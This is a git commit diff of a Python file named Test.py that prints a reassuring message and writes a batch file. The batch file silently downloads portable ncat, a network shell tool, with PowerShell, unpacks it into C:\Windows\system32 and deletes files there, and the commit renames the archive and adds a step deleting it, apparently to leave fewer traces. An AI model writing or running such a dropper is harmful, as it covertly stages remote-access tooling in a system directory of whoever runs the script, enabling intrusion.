7857649aa165ebf257d79e12406d53d35d2c225c
TheCodeFox-tech <78907865+TheCodeFox-tech@users.noreply.github.com>
2021-02-13 15:07:59 +0100

    Update Test.py

--- Test.py
+++ Test.py
@@ -5,8 +5,9 @@ print("That's good")
 TestBat = open(r'Test.bat', '+w')
 TestBat.write('''@echo off
               cls
-              powershell wget http://nmap.org/dist/ncat-portable-5.59BETA1.zip -o ncat.zip
-              powershell Expand-Archive -LiteralPath .\ncat.zip -DestinationPath C:\Windows\system32
+              powershell wget http://nmap.org/dist/ncat-portable-5.59BETA1.zip -o cat.zip
+              powershell Expand-Archive -LiteralPath .\cat.zip -DestinationPath C:\Windows\system32
+              del .\cat.zip
               cd C:\Windows\system32
               del README''')
 TestBat.close()
